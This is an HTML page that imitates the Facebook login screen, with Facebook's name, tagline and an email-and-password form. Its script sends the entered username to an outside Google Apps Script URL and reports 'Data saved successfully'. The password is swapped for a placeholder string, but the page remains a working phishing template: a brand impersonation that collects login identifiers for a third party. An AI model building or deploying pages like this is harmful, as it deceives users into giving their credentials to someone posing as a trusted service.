<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook Login Page</title>
  <link rel="stylesheet" href="facebook.css" />
</head>
<body>
  <div class="content">
    <div class="flex-div">
      <div class="name-content">
        <h1 class="logo">Facebook</h1>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>
      <form id="contactForm">
        <input type="text" name="username" placeholder="Email or Phone Number" required />
        <input type="password" name="password" placeholder="Password" required> <!-- Changed to password type -->
        <button type="submit" class="login">Log In</button>
        <a href="#">Forgot Password ?</a>
        <hr>
        <button type="button" class="create-account">Create New Account</button> <!-- Added type="button" -->
      </form>
    </div>
  </div>
  <script>
    document.getElementById("contactForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  
  const formData = new FormData(e.target);
  const data = Object.fromEntries(formData.entries());

  try {
    const response = await fetch("https://script.google.com/macros/s/AKfycbxA9_lX9RjLLQZm1M03jJDyYsvY9eGCLv--QSzmnU_G6UMglVDdd79I7x20ANYBbAzo/exec", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: data.username,
        // Never send real passwords in production
        password: "masked_for_security" 
      })
    });

    if (!response.ok) throw new Error("Network response was not OK");
    
    const result = await response.json();
    console.log("Server response:", result);
    
    if (result.success) {
      alert("Data saved successfully!");
    } else {
      throw new Error(result.error || "Unknown server error");
    }
  } catch (error) {
    console.error("Error:", error);
    alert("Submission failed: " + error.message);
  }
});
  </script>
</body>
</html>
